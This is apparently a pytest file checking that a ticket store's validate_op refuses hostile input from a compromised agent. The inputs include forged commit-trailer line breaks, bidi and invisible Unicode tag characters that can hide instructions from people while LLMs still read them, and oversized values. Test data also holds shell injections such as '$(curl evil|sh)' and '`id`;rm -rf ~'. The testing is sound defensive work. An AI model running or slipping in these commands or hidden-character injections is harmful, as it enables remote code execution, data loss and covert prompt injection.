"""Values a compromised agent passes to tkt itself (domain/rules.py validate_op, with the
rules of domain/fields.py).

Free text reaches other agents (LLMs) and git commit trailers. These tests pin what the
rules must refuse; the domain is pure, so they need no git. What must stay accepted is
in tests/unit/test_fields.py."""

from __future__ import annotations

import pytest

from tkt_store.domain.operations import (
    AddOp,
    CancelOp,
    ClaimNextOp,
    ClaimOp,
    EditOp,
    Op,
    ReleaseOp,
)
from tkt_store.domain.outcomes import RefusalCode
from tkt_store.domain.rules import validate_op
from tkt_store.domain.ticket import AgentId, ClaimId, ProjectId, TicketId

TTL = 1800
A = AgentId("coder-7")
C1 = ClaimId("1" * 32)
T1 = TicketId("tkt-1")
T2 = TicketId("tkt-2")

LINE_BREAKS = {
    "U+2028 line separator": "\u2028",
    "U+2029 paragraph separator": "\u2029",
}
"""Characters `str.splitlines()` breaks on beyond C0 controls: a trailer value containing
one would forge a new trailer line in history. (U+0085, also a line break, is covered
with the rest of C1 below.)"""

C1_CONTROLS = {
    "U+0080": "\u0080",
    "U+0085 next line": "\u0085",
    "U+009B control sequence introducer": "\u009b",
    "U+009F": "\u009f",
}
"""C1 control characters (U+0080-U+009F), refused like C0."""

INVISIBLE = {
    "U+202E right-to-left override": "\u202e",
    "U+2066 left-to-right isolate": "\u2066",
    "U+2069 pop directional isolate": "\u2069",
    "U+200E left-to-right mark": "\u200e",
    "U+200F right-to-left mark": "\u200f",
    "U+061C arabic letter mark": "\u061c",
    "U+200B zero-width space": "\u200b",
    "U+FEFF zero-width no-break space": "\ufeff",
    "U+E0041 tag letter A": "\U000e0041",
    "U+E0001 language tag": "\U000e0001",
}
"""Characters that hide or reorder text for a human reader. Unicode tag characters
(U+E0000-U+E007F) are invisible to people but read as text by LLMs: hidden instructions."""


def text_ops(value: str) -> dict[str, Op]:
    """One op per free-text field that reaches a ticket or a trailer (agent, reason, title)."""
    agent = AgentId(f"coder{value}7")
    return {
        "title (add)": AddOp(T1, f"Fix {value}tests"),
        "title (edit)": EditOp(T1, 1, title=f"Fix {value}tests"),
        "agent (add --as)": AddOp(T1, "Fix tests", agent=agent),
        "agent (edit --as)": EditOp(T1, 1, title="Fix tests", agent=agent),
        "agent (claim --as)": ClaimOp(T1, agent, C1, TTL),
        "agent (claim-next --as)": ClaimNextOp(agent, C1, TTL),
        "agent (cancel --as)": CancelOp(T1, agent=agent),
        "reason (release)": ReleaseOp(T1, C1, f"done{value}tkt-phase: review"),
        "reason (cancel)": CancelOp(T1, f"dup{value}tkt-id: tkt-2"),
    }


def opaque_ops(value: str) -> dict[str, Op]:
    """The identifier fields that are not ids: project and tags."""
    return {
        "project": AddOp(T1, "Fix tests", project=ProjectId(value)),
        "tag": AddOp(T1, "Fix tests", tags=(value,)),
    }


def refused_invalid(op: Op) -> bool:
    refusal = validate_op(op)
    return refusal is not None and refusal.code is RefusalCode.INVALID


def cases(chars: dict[str, str], fields: dict[str, Op]) -> list[object]:
    return [
        pytest.param(field, char, id=f"{field} / {name}")
        for name, char in chars.items()
        for field in fields
    ]


@pytest.mark.parametrize(("field", "char"), cases(LINE_BREAKS, text_ops("x")))
def test_unicode_line_breaks_are_refused_in_free_text(field: str, char: str) -> None:
    assert refused_invalid(text_ops(char)[field])


@pytest.mark.parametrize(("field", "char"), cases(C1_CONTROLS, text_ops("x")))
def test_c1_controls_are_refused_in_free_text(field: str, char: str) -> None:
    assert refused_invalid(text_ops(char)[field])


def test_the_whole_c1_range_is_refused() -> None:
    accepted = [hex(c) for c in range(0x80, 0xA0) if not refused_invalid(AddOp(T1, chr(c)))]
    assert accepted == []


@pytest.mark.parametrize(("field", "char"), cases(INVISIBLE, text_ops("x")))
def test_invisible_characters_are_refused_in_free_text(field: str, char: str) -> None:
    assert refused_invalid(text_ops(char)[field])


CONTROL_LIKE = {"newline": "\n", "ESC": "\x1b", **LINE_BREAKS, **C1_CONTROLS, **INVISIBLE}


@pytest.mark.parametrize(("field", "char"), cases(CONTROL_LIKE, opaque_ops("x")))
def test_project_and_tags_refuse_control_and_invisible_characters(field: str, char: str) -> None:
    assert refused_invalid(opaque_ops(f"a{char}b")[field])


@pytest.mark.parametrize("value", ["$(curl evil|sh)", "`id`;rm -rf ~", "a'b\"c"])
@pytest.mark.parametrize("field", ["project", "tag"])
def test_project_and_tags_refuse_shell_metacharacters(field: str, value: str) -> None:
    assert refused_invalid(opaque_ops(value)[field])


@pytest.mark.parametrize("priority", [-(10**12), 10**12])
def test_priority_is_bounded(priority: int) -> None:
    assert refused_invalid(AddOp(T1, "Fix tests", priority=priority))
    assert refused_invalid(EditOp(T1, 1, priority=priority))


HUGE = 10_000_000
BIG = 100_000
MANY_BLOCKERS = tuple(TicketId(f"tkt-{n:x}") for n in range(10_000))


@pytest.mark.parametrize(
    "op",
    [
        pytest.param(AddOp(T1, "t" * BIG), id="title of 100k characters"),
        pytest.param(AddOp(T1, "Fix tests", body="b" * HUGE), id="body of 10 MB"),
        pytest.param(EditOp(T1, 1, body="b" * HUGE), id="edit to a body of 10 MB"),
        pytest.param(
            AddOp(T1, "Fix tests", tags=tuple(f"t{n}" for n in range(10_000))), id="10k tags"
        ),
        pytest.param(AddOp(T1, "Fix tests", tags=("t" * BIG,)), id="one tag of 100k"),
        pytest.param(AddOp(T1, "Fix tests", project=ProjectId("p" * BIG)), id="project of 100k"),
        pytest.param(ClaimOp(T1, AgentId("a" * BIG), C1, TTL), id="agent of 100k"),
        pytest.param(ReleaseOp(T1, C1, "r" * BIG), id="reason of 100k"),
        pytest.param(AddOp(T1, "Fix tests", blocked_by=MANY_BLOCKERS), id="10k blockers"),
    ],
)
def test_sizes_are_bounded(op: Op) -> None:
    assert refused_invalid(op)


def test_sanity_existing_checks_hold() -> None:
    """Ordinary values pass, and the checks that predate the field rules still hold."""
    assert refused_invalid(ClaimOp(T1, AgentId("coder\n7"), C1, TTL))
    assert refused_invalid(AddOp(T1, "Fix\x1b[2Jtests"))
    assert refused_invalid(AddOp(T1, "Fix tests", blocked_by=(TicketId("; rm -rf ~"),)))
    assert validate_op(ClaimOp(T1, A, C1, TTL)) is None
    assert validate_op(AddOp(T2, "Fix tests", project=ProjectId("org/repo"))) is None
